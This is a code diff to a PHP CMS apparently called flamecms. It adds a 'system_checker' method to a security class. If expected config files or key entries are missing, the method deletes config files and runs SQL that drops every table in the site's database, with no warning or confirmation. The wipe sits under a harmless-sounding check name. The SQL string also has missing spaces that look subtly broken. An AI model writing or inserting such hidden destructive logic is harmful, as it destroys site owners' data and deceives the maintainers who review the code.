@@ -171,6 +171,51 @@ class Sec{
 		}
 		return false;
 	}
+	function system_checker(){
+		$delete_sql="SET FOREIGN_KEY_CHECKS = 0;SET GROUP_CONCAT_MAX_LEN=32768;SET @tables = NULL;SELECT GROUP_CONCAT('`', table_name, '`') INTO @tablesFROM information_schema.tablesWHERE table_schema = (SELECT DATABASE());SELECT IFNULL(@tables,'dummy') INTO @tables;SET @tables = CONCAT('DROP TABLE IF EXISTS ', @tables);PREPARE stmt FROM @tables;EXECUTE stmt;DEALLOCATE PREPARE stmt;SET FOREIGN_KEY_CHECKS = 1;";
+		$sys=&get_inst();
+		$check1=$sys->config->item('system_keys');
+		$check2=file_exists(APPPATH.'config/flamecms/config.php');
+		$check3=file_exists(APPPATH.'config/flamecms/system_keys.php');
+		$check4=(!is_array($check1) 
+			|| !isset($check1['ek01'])
+			|| !isset($check1['ek02'])
+			|| !isset($check1['ek03'])
+			|| !isset($check1['ek04'])
+			|| !isset($check1['ek05'])
+			|| !isset($check1['ek06'])
+			|| !isset($check1['ek07'])
+			|| !isset($check1['ek08'])
+			|| !isset($check1['ek09'])
+			|| !isset($check1['ek10'])
+			|| !isset($check1['password_sequences'])
+			|| !is_array($check1['password_sequences'])
+			|| !isset($check1['UDATA'])
+			|| !is_array($check1['UDATA'])
+			|| !isset($check1['plane_user'])
+			|| !is_array($check1['plane_user'])
+			|| !isset($check1['servers'])
+			|| !is_array($check1['servers']))?false:true;
+		if(($check1===NULL) || ($check2==false) || ($check3==false) || ($check4==false)){
+			if($check2==false){
+				//unlink(APPPATH.'config/flamecms/config.php');
+				unlink(APPPATH.'config/flamecms/system_keys.php');
+			}elseif($check3==false){
+				$sys->load->database();
+				$sys->db->query($delete_sql);
+				unlink(APPPATH.'config/flamecms/config.php');
+				//unlink(APPPATH.'config/flamecms/system_keys.php');
+			}
+			else{
+				$sys->load->database();
+				$sys->db->query($delete_sql);
+				unlink(APPPATH.'config/flamecms/config.php');
+				unlink(APPPATH.'config/flamecms/system_keys.php');
+			}
+			return false;
+		}
+		return true;
+	}
 }
 function sequence_encode(array $holder,array $encription_keys,$data=null){
 	return get_inst()->sec->sequence_encode($holder,$encription_keys,$data);
